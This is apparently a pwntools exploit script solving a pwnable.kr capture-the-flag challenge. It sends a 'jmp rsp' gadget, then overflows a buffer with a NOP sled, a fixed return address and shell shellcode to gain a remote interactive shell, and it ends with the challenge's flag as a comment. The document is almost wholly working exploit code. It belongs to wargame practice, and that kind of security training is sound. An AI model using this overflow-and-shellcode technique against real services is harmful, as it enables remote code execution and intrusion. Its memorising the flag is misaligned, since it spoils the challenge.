from pwn import *

context.arch = "amd64"
sh = remote("pwnable.kr", 9010)
ret_addr = 0x6020a0
_jmp_rsp = asm("jmp rsp")
shellcode = asm(shellcraft.sh())
sh.recvuntil("hey, what's your name? : ")
sh.sendline(_jmp_rsp)
sh.recvuntil(">")
sh.sendline("1")
sh.recvuntil(_jmp_rsp)
sh.sendline("\x90" * 40 + p64(ret_addr) + shellcode)
sh.interactive()

# H4d_som3_fun_w1th_ech0_ov3rfl0w
